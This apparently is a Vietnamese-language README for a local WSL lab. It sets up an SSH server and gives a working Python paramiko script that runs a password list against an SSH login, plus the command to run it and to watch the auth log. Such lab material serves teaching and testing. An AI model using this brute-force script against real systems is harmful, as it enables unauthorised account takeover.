
#  SSH Brute-force Tool (WSL Lab)

Công cụ Python mô phỏng brute-force SSH login trên máy thật Windows, sử dụng WSL Ubuntu làm SSH server.

---

## 📦 Cấu trúc thư mục

```

lab\_ssh\_bruteforce/
├── ssh\_brute\_force.py
├── passwords.txt
└── README.md

````

---

## ✅ Phần 1: Cài đặt SSH Server trên WSL (Ubuntu)

### 1. Cài SSH server

```bash
sudo apt update
sudo apt install openssh-server -y
````

### 2. Đặt mật khẩu cho user WSL

```bash
passwd
```

### 3. Bắt đầu dịch vụ SSH

```bash
sudo service ssh start
```

### 4. Lấy IP WSL

```bash
ip addr | grep inet
```

Ghi lại IP `172.x.x.x` để kết nối từ Windows.

---

## ✅ Phần 2: Kiểm tra SSH từ Windows

```bash
ssh <username>@<ip_WSL>
```

---

## ✅ Phần 3: Tập tin mật khẩu

**passwords.txt**

```txt
1234
admin
test
123456
your_real_password
```

---

## ✅ Phần 4: Mã nguồn brute-force

**ssh\_brute\_force.py**

```python
import paramiko
import sys
import time

def ssh_brute_force(ip, username, password_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(password_file, "r", encoding="utf-8") as file:
        passwords = file.readlines()

    print(f"[+] Bắt đầu brute-force SSH trên {ip} với user '{username}'")

    for password in passwords:
        password = password.strip()
        try:
            ssh.connect(ip, username=username, password=password, timeout=3)
            print(f"[✓] Thành công! Mật khẩu là: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[-] Sai mật khẩu: {password}")
        except paramiko.SSHException:
            print("[!] Quá nhiều lần thử, tạm nghỉ...")
            time.sleep(5)
        except Exception as e:
            print(f"[!] Lỗi khác: {e}")
            return
    print("[×] Không tìm được mật khẩu phù hợp.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Cách dùng: python ssh_brute_force.py <IP> <username> <password_file>")
        sys.exit(1)

    target_ip = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]

    ssh_brute_force(target_ip, username, password_file)
```

---

## ✅ Phần 5: Chạy chương trình

```bash
python ssh_brute_force.py 172.27.199.168 bocchi89 passwords.txt
```

---

## ✅ Phần 6: Xem log SSH trong WSL

```bash
sudo tail -f /var/log/auth.log
```

Nếu không có log:

```bash
sudo apt install rsyslog -y
sudo service rsyslog start
```

---

## ⚠️ Cảnh báo

* Chỉ sử dụng trong lab nội bộ (WSL).
* Không tấn công hệ thống thật nếu không được phép.

---
